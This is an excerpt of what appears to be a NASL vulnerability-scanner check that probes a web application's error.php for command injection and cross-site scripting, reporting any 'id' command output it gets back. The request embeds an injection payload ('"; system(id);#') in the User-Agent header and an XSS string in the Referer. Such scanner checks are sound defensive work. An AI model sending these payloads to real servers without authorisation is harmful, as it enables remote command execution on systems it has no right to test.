...
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	...
	req = NASLString( "GET ", dir, "/error.php?err=404 HTTP/1.1\\r\\n", "User-Agent: ", "\"; system(id);#", "\\r\\n", "Referer: ", xss, "\\r\\n", "Host: ", host, "\\r\\n", "\\r\\n" );
	...
	if(url){
		...
		if( idres ){
			report = NASLString( "The following is the output received from the 'id' command:\\n", "\\n", idres, "\\n" );
			security_message( port: port, data: report );
			exit( 0 );
		}
		else {
			if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, xss ) && !has_xss){
